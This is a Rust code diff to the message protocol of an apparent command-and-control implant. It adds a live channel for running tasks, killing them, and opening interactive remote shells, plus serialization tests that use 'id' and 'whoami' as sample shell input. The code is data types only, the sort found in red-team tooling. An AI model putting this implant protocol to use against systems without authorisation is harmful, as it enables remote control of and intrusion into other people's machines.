@@ -43,7 +43,7 @@ pub struct RegisterAck {
 }
 
 /// A command to run. Sent server -> implant inside Task envelope.
-#[derive(Debug, Clone, Serialize, Deserialize)]
+#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
 pub struct Task {
     pub id: Uuid,
     pub command: String,
@@ -93,6 +93,58 @@ pub struct PollReply {
     pub acks: Vec<FileAck>,
     /// Upload chunks (server -> implant) for the active upload transfer.
     pub push_chunks: Vec<FileChunk>,
+}
+
+/// A frame the server writes straight to a connected implant.
+///
+/// These ride the live channel (a persistent WebSocket carrier) and never enter
+/// the task queue: a `Kill` lands in one network round trip instead of behind
+/// whatever work is already pending, and an attached shell is usable the moment
+/// the operator types. If the carrier is not connected the frame is not queued
+/// — the caller decides whether to fall back.
+#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
+#[serde(tag = "op", rename_all = "snake_case")]
+pub enum Live {
+    /// Run one task now. Identical execution to a polled task, but the result
+    /// still travels on the next beacon like every other task result.
+    Task { task: Task },
+    /// Stop one task immediately, whether it is queued, accepted or running.
+    Kill { task_id: Uuid },
+    /// Start an interactive shell under a server-chosen id.
+    ShellOpen {
+        shell_id: Uuid,
+        program: String,
+        args: Vec<String>,
+    },
+    /// Bytes the operator typed, verbatim (control characters included).
+    ShellInput { shell_id: Uuid, data: String },
+    /// Tear the shell (and its child) down.
+    ShellClose { shell_id: Uuid },
+}
+
+/// What an implant writes to the server on the live channel without being polled.
+#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
+#[serde(tag = "event", rename_all = "snake_case")]
+pub enum LiveEvent {
+    /// Echo of an accepted `Live::Kill`; `killed` is false when no matching
+    /// task was running (it may have already finished).
+    Killed { task_id: Uuid, killed: bool },
+    /// The shell is running. `pty` reports whether the child got a real
+    /// terminal (line editing, job control) or a pipe.
+    ShellReady {
+        shell_id: Uuid,
+        program: String,
+        pty: bool,
+    },
+    /// Shell output. `data` is base64 of the raw bytes so binary output and
+    /// split multi-byte sequences survive JSON.
+    ShellData {
+        shell_id: Uuid,
+        data: String,
+        stderr: bool,
+    },
+    /// The shell process ended on its own.
+    ShellExit { shell_id: Uuid, code: Option<i32> },
 }
 
 /// One chunk of a file streaming from the implant to the server.
@@ -183,6 +235,55 @@ mod tests {
         let reply: PollReply =
             serde_json::from_str(r#"{"tasks":[],"acks":[],"push_chunks":[]}"#).unwrap();
         assert!(reply.result_acks.is_empty());
+    }
+
+    #[test]
+    fn live_channel_messages_round_trip() {
+        use crate::msgs::{Live, LiveEvent};
+
+        let task = Task {
+            id: Uuid::new_v4(),
+            command: "id".into(),
+            args: vec!["-u".into()],
+            timeout_ms: 30_000,
+        };
+        let frame = Live::Task { task: task.clone() };
+        let encoded = serde_json::to_string(&frame).unwrap();
+        assert!(encoded.contains(r#""op":"task""#), "{encoded}");
+        assert_eq!(serde_json::from_str::<Live>(&encoded).unwrap(), frame);
+
+        let kill = Live::Kill { task_id: task.id };
+        let encoded = serde_json::to_string(&kill).unwrap();
+        assert!(encoded.contains(r#""op":"kill""#), "{encoded}");
+        assert_eq!(serde_json::from_str::<Live>(&encoded).unwrap(), kill);
+
+        let input = Live::ShellInput {
+            shell_id: Uuid::new_v4(),
+            // Control characters an operator actually sends over a terminal.
+            data: "id\rwhoami\u{3}".into(),
+        };
+        let encoded = serde_json::to_string(&input).unwrap();
+        assert_eq!(serde_json::from_str::<Live>(&encoded).unwrap(), input);
+
+        let shell_id = Uuid::new_v4();
+        let event = LiveEvent::ShellData {
+            shell_id,
+            data: "cm9vdA==".into(),
+            stderr: false,
+        };
+        let encoded = serde_json::to_string(&event).unwrap();
+        assert!(encoded.contains(r#""event":"shell_data""#), "{encoded}");
+        assert_eq!(serde_json::from_str::<LiveEvent>(&encoded).unwrap(), event);
+    }
+
+    /// A payload built before the live channel existed must not make the server
+    /// send frames it cannot read: absent fields default, unknown variants fail.
+    #[test]
+    fn legacy_peers_never_see_a_live_frame_they_could_misread_as_a_poll() {
+        use crate::msgs::{Live, LiveEvent};
+
+        assert!(serde_json::from_str::<Live>(r#"{"op":"task"}"#).is_err());
+        assert!(serde_json::from_str::<LiveEvent>(r#"{"event":"killed"}"#).is_err());
     }
 
     #[test]
